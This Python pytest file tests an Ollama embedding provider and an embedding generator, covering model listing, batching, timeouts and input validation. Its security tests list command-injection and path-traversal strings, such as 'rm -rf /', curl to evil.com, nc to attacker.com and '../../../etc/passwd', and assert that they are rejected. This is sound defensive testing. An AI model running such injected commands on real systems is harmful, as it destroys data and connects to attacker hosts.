"""Comprehensive tests for Ollama embedding integration."""

import pytest
import asyncio
from unittest.mock import Mock, patch, MagicMock
import numpy as np
import requests
from concurrent.futures import Future

from src.pdf_processing.ollama_provider import OllamaEmbeddingProvider
from src.pdf_processing.embedding_generator import EmbeddingGenerator


class TestOllamaProvider:
    """Test suite for OllamaEmbeddingProvider."""
    
    @pytest.fixture
    def provider(self):
        """Create a test provider instance."""
        return OllamaEmbeddingProvider(model_name="test-model")
    
    def test_init(self):
        """Test provider initialization."""
        provider = OllamaEmbeddingProvider(
            model_name="nomic-embed-text",
            base_url="http://localhost:11434"
        )
        assert provider.model_name == "nomic-embed-text"
        assert provider.base_url == "http://localhost:11434"
        assert provider.api_url == "http://localhost:11434/api"
    
    @patch('requests.get')
    def test_check_ollama_installed_running(self, mock_get, provider):
        """Test checking if Ollama is installed and running."""
        mock_get.return_value.status_code = 200
        assert provider.check_ollama_installed() is True
        mock_get.assert_called_with("http://localhost:11434/api/tags", timeout=5)
    
    @patch('requests.get')
    @patch('subprocess.run')
    def test_check_ollama_installed_not_running(self, mock_run, mock_get, provider):
        """Test checking if Ollama is installed but not running."""
        mock_get.side_effect = requests.ConnectionError()
        mock_run.return_value.returncode = 0
        
        assert provider.check_ollama_installed() is True
        mock_run.assert_called_once()
        
        # Verify shlex is used for command safety
        args = mock_run.call_args[0][0]
        assert args == ["ollama", "--version"]
    
    @patch('subprocess.Popen')
    @patch.object(OllamaEmbeddingProvider, 'check_ollama_installed')
    def test_start_ollama_service(self, mock_check, mock_popen, provider):
        """Test starting Ollama service."""
        mock_process = Mock()
        mock_process.poll.return_value = None
        mock_popen.return_value = mock_process
        mock_check.return_value = True
        
        with patch('time.sleep'):
            assert provider.start_ollama_service() is True
        
        # Verify process started with proper isolation
        mock_popen.assert_called_once()
        kwargs = mock_popen.call_args[1]
        assert kwargs['start_new_session'] is True
    
    @patch('requests.get')
    def test_list_available_models(self, mock_get, provider):
        """Test listing available models."""
        mock_get.return_value.status_code = 200
        mock_get.return_value.json.return_value = {
            "models": [
                {"name": "model1"},
                {"name": "model2"}
            ]
        }
        
        models = provider.list_available_models()
        assert models == ["model1", "model2"]
        mock_get.assert_called_with("http://localhost:11434/api/tags", timeout=10)
    
    def test_is_model_available(self, provider):
        """Test checking if a model is available."""
        with patch.object(provider, 'list_available_models', return_value=["model1", "model2:latest"]):
            assert provider.is_model_available("model1") is True
            assert provider.is_model_available("model2") is True
            assert provider.is_model_available("model3") is False
    
    @patch('requests.post')
    def test_pull_model_validation(self, mock_post, provider):
        """Test model name validation in pull_model."""
        # Test invalid model names
        assert provider.pull_model("../../etc/passwd") is False
        assert provider.pull_model("rm -rf /") is False
        assert provider.pull_model("") is False
        
        # Valid model names should proceed
        mock_post.return_value.iter_lines.return_value = []
        with patch.object(provider, 'is_model_available', return_value=True):
            assert provider.pull_model("valid-model") is True
            assert provider.pull_model("model_name") is True
            assert provider.pull_model("model:tag") is True
    
    @patch('requests.post')
    def test_generate_embedding_with_timeout(self, mock_post, provider):
        """Test embedding generation with proper timeout."""
        mock_post.return_value.status_code = 200
        mock_post.return_value.json.return_value = {
            "embedding": [0.1, 0.2, 0.3]
        }
        
        embedding = provider.generate_embedding("test text")
        assert embedding == [0.1, 0.2, 0.3]
        
        # Verify timeout is set
        mock_post.assert_called_once()
        kwargs = mock_post.call_args[1]
        assert kwargs['timeout'] == 30
    
    @patch('requests.post')
    def test_generate_embeddings_batch_parallel(self, mock_post, provider):
        """Test parallel batch embedding generation."""
        # Mock responses
        mock_post.return_value.status_code = 200
        mock_post.return_value.json.side_effect = [
            {"embedding": [0.1, 0.2, 0.3]},
            {"embedding": [0.4, 0.5, 0.6]},
            {"embedding": [0.7, 0.8, 0.9]}
        ]
        
        texts = ["text1", "text2", "text3"]
        embeddings = provider.generate_embeddings_batch(texts, max_workers=2)
        
        assert len(embeddings) == 3
        assert all(len(emb) == 3 for emb in embeddings)
        
        # Verify normalization
        for emb in embeddings:
            norm = np.linalg.norm(emb)
            assert abs(norm - 1.0) < 0.01  # Should be normalized
    
    @patch('requests.post')
    def test_generate_embeddings_batch_error_handling(self, mock_post, provider):
        """Test batch generation with error handling."""
        # Make one request fail
        mock_post.return_value.status_code = 200
        
        def side_effect(*args, **kwargs):
            if mock_post.call_count == 2:
                raise requests.RequestException("Network error")
            response = Mock()
            response.status_code = 200
            response.json.return_value = {"embedding": [0.1, 0.2, 0.3]}
            return response
        
        mock_post.side_effect = side_effect
        provider._embedding_dimension = 3
        
        texts = ["text1", "text2", "text3"]
        embeddings = provider.generate_embeddings_batch(texts)
        
        assert len(embeddings) == 3
        # Check that failed embedding is replaced with zeros
        assert any(all(v == 0.0 for v in emb) for emb in embeddings)
    
    def test_get_model_info(self, provider):
        """Test getting model information."""
        provider._embedding_dimension = 768
        info = provider.get_model_info()
        
        assert info["provider"] == "ollama"
        assert info["model_name"] == "test-model"
        assert info["dimension"] == 768
        assert info["base_url"] == "http://localhost:11434"


class TestEmbeddingGeneratorIntegration:
    """Test suite for EmbeddingGenerator with Ollama integration."""
    
    @patch.object(OllamaEmbeddingProvider, 'check_ollama_installed')
    @patch.object(OllamaEmbeddingProvider, 'is_model_available')
    def test_ollama_initialization(self, mock_available, mock_installed):
        """Test EmbeddingGenerator with Ollama."""
        mock_installed.return_value = True
        mock_available.return_value = True
        
        generator = EmbeddingGenerator(use_ollama=True, model_name="test-model")
        assert generator.use_ollama is True
        assert generator.ollama_provider is not None
    
    @patch.object(OllamaEmbeddingProvider, 'check_ollama_installed')
    def test_ollama_fallback_to_sentence_transformers(self, mock_installed):
        """Test fallback to Sentence Transformers when Ollama unavailable."""
        mock_installed.return_value = False
        
        with patch.object(OllamaEmbeddingProvider, 'start_ollama_service', return_value=False):
            generator = EmbeddingGenerator(use_ollama=True)
            assert generator.use_ollama is False
            assert generator.model is not None  # Should have Sentence Transformer model
    
    @patch.object(OllamaEmbeddingProvider, 'generate_embedding')
    @patch.object(OllamaEmbeddingProvider, 'check_ollama_installed')
    @patch.object(OllamaEmbeddingProvider, 'is_model_available')
    def test_generate_single_embedding_ollama(self, mock_available, mock_installed, mock_generate):
        """Test single embedding generation with Ollama."""
        mock_installed.return_value = True
        mock_available.return_value = True
        mock_generate.return_value = [0.1, 0.2, 0.3]
        
        generator = EmbeddingGenerator(use_ollama=True, model_name="test-model")
        embedding = generator.generate_single_embedding("test text")
        
        # Check normalization
        norm = np.linalg.norm(embedding)
        assert abs(norm - 1.0) < 0.01
    
    def test_get_model_info_sentence_transformers(self):
        """Test model info for Sentence Transformers."""
        generator = EmbeddingGenerator(use_ollama=False)
        info = generator.get_model_info()
        
        assert info["provider"] == "sentence_transformers"
        assert "model_name" in info
        assert "device" in info
        assert "embedding_dimension" in info
    
    @patch('os.getenv')
    @patch.object(OllamaEmbeddingProvider, 'prompt_for_model_selection')
    def test_prompt_and_create(self, mock_prompt, mock_getenv):
        """Test interactive prompt for model selection."""
        mock_getenv.return_value = None
        mock_prompt.return_value = "nomic-embed-text"
        
        with patch.object(OllamaEmbeddingProvider, 'check_ollama_installed', return_value=True):
            with patch.object(OllamaEmbeddingProvider, 'is_model_available', return_value=True):
                generator = EmbeddingGenerator.prompt_and_create()
                assert generator.use_ollama is True
                assert generator.ollama_provider.model_name == "nomic-embed-text"


class TestOllamaSecurityFixes:
    """Test suite specifically for security fixes."""
    
    def test_no_command_injection(self):
        """Verify command injection is prevented."""
        provider = OllamaEmbeddingProvider()
        
        # These should not execute dangerous commands
        dangerous_inputs = [
            "model; rm -rf /",
            "model && curl evil.com",
            "model | nc attacker.com 1234",
            "../../../etc/passwd"
        ]
        
        for dangerous_input in dangerous_inputs:
            result = provider.pull_model(dangerous_input)
            assert result is False  # Should reject invalid model names
    
    @patch('subprocess.run')
    def test_subprocess_uses_shlex(self, mock_run):
        """Verify subprocess calls use shlex for safety."""
        provider = OllamaEmbeddingProvider()
        mock_run.return_value.returncode = 0
        
        with patch('requests.get', side_effect=requests.ConnectionError()):
            provider.check_ollama_installed()
        
        # Verify the command was properly split
        args = mock_run.call_args[0][0]
        assert isinstance(args, list)
        assert args == ["ollama", "--version"]
        
        # Verify timeout is set
        kwargs = mock_run.call_args[1]
        assert 'timeout' in kwargs
        assert kwargs['timeout'] == 5
    
    def test_all_http_requests_have_timeouts(self):
        """Verify all HTTP requests have timeouts."""
        provider = OllamaEmbeddingProvider()
        
        with patch('requests.get') as mock_get:
            provider.list_available_models()
            assert mock_get.call_args[1]['timeout'] == 10
        
        with patch('requests.post') as mock_post:
            mock_post.return_value.status_code = 200
            mock_post.return_value.json.return_value = {"embedding": []}
            
            provider.generate_embedding("text")
            assert mock_post.call_args[1]['timeout'] == 30


if __name__ == "__main__":
    pytest.main([__file__, "-v"])